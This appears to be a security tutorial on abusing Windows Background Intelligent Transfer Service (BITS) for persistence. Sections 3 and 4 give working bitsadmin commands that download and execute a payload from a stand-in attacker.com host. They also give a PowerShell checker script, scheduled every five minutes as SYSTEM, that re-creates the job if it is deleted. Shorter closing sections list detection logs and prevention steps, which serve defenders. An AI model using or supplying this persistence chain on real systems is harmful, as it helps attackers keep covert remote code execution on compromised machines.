1. Introduction

What is BITS?
Background Intelligent Transfer Service (BITS) is a Windows component that transfers files in the background using idle network bandwidth. It's used by services like Windows Update and Microsoft Defender.

Abuse for Persistence
Attackers can abuse BITS to stealthily download and execute payloads, leveraging its ability to:

Operate under system services

Run in the background

Persist across reboots

This makes BITS ideal for maintaining covert, long-term access on compromised machines.

2. Understanding BITS and Its Capabilities

BITS jobs are asynchronous file transfer tasks. Once a download completes, BITS can be configured to launch a program. Its persistence across reboots and ability to retry failed transfers makes it highly attractive to attackers.

Why Attackers Use BITS

Blends in with legitimate system behavior

Can be executed under system or user contexts

Reliable retries and background operation

Less commonly monitored compared to Scheduled Tasks or Registry persistence

3. Creating a Malicious BITS Job

Steps (run in CMD as Administrator):

Create a new BITS job:
bitsadmin /create malwareJob

Add a malicious payload to download:
bitsadmin /addfile malwareJob http://attacker.com/payload.exe C:\Users\Public\payload.exe

Set the job to execute the file upon completion:
bitsadmin /SetNotifyCmdLine malwareJob "C:\Users\Public\payload.exe" ""

Add retry options for reliability:
bitsadmin /SetMinRetryDelay malwareJob 60
bitsadmin /SetNoProgressTimeout malwareJob 3600

Start the job:
bitsadmin /resume malwareJob

This job downloads a payload from a remote server and executes it automatically when the download completes.

4. Implementing a Persistence Mechanism

To ensure the malicious BITS job persists even if removed, a PowerShell checker script can be used.

Checker Script (checker.ps1):

$jobName = "malwareJob"
$downloadUrl = "http://attacker.com/payload.exe"
$localPath = "C:\Users\Public\payload.exe"

function CreateBITSJob {
bitsadmin /create $jobName
bitsadmin /addfile $jobName $downloadUrl $localPath
bitsadmin /SetNotifyCmdLine $jobName $localPath ""
bitsadmin /resume $jobName
}

$exists = bitsadmin /list | Select-String $jobName
if (-not $exists) {
Write-Output "BITS job not found. Recreating..."
CreateBITSJob
} else {
Write-Output "BITS job still exists."
}

This script checks whether the malicious job exists. If not, it recreates it.

Automate the script with Scheduled Tasks:

schtasks /create /tn "BITSChecker" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\checker.ps1" /sc minute /mo 5 /ru SYSTEM

This ensures the script runs every 5 minutes as SYSTEM, recreating the malicious job if it’s deleted.

5. Detecting and Preventing Malicious BITS Jobs

Detection

Event Viewer Logs:
Applications and Services Logs → Microsoft → Windows → BITS-Client → Operational

Command-line inspection:
List all jobs:
bitsadmin /list /allusers

View job details:
bitsadmin /info malwareJob /verbose

Prevention Tips

Limit access to bitsadmin through AppLocker or similar controls

Monitor BITS job creation via EDR and Sysmon

Alert on non-standard downloads to sensitive directories

Disable BITS service if not needed in the environment

Inspect BITS NotifyCmdLine executions

6. Conclusion

Summary
BITS is a powerful service native to Windows, capable of performing stealthy file transfers and executions. It can be used by attackers to maintain access on compromised systems through persistent jobs that are difficult to detect.

Defense Recommendations

Regularly audit for unknown or suspicious BITS jobs

Monitor usage of bitsadmin.exe and PowerShell-based job recreation

Investigate Event Logs for signs of unauthorized transfers or executions

Use endpoint detection tools to correlate BITS activity with known indicators of compromise

